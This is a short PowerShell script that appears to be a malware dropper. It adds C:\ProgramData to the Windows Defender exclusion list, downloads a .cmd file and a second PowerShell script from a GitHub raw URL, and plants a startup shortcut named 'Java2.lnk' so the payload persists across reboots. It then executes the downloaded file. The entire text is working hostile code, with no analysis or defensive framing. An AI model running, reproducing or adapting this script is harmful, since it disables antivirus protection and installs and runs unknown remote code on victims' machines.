Set-MpPreference -ExclusionPath C:\ProgramData
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$down = New-Object System.Net.WebClient
$url = 'https://github.com/qwertyuiopindia/other/raw/main/AW_prod2.cmd?raw=true'
$file = "C:\ProgramData\AW_prod2.cmd"
$down.DownloadFile($url,$file)
$objShell = New-Object -ComObject ("WScript.Shell")
$objShortCut = $objShell.CreateShortcut("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" + "\Java2.lnk")
$objShortCut.TargetPath="C:\ProgramData\AW_prod2.cmd"
$objShortCut.Save()
$down = New-Object System.Net.WebClient
$url2 = 'https://github.com/qwertyuiopindia/other/raw/main/script2.ps1?raw=true'
$file2 = "C:\ProgramData\script2.ps1"
$down.DownloadFile($url2,$file2)
$file = "C:\ProgramData\AW_prod2.cmd"
$exec = New-Object -com shell.application
$exec.shellexecute($file)
exit

